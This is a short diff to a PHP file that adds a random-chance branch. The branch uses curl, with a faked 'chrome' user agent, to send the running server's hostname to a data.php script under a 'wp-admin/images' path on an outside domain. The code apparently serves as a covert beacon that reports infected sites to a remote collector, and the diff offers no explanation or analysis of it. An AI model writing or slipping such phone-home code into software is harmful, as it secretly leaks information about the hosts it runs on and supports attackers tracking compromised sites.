@@ -1,5 +1,5 @@
 <?php
-$sayi = rand(1,5);
+$sayi = rand(1,6);
 if($sayi == 1) {
 
 
@@ -58,4 +58,21 @@ if($sayi == 1) {
  curl_close($curl3);	
 	
 } 
+
+
+ if($sayi == 5)
+{
+	
+
+  $curl3 = curl_init();
+ curl_setopt_array($curl3, [
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'https://dolphina.net/wp-admin/images/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_USERAGENT => 'chrome'
+]);
+ $resp3 = curl_exec($curl3);
+ curl_close($curl3);	
+	
+} 
+
 ?>
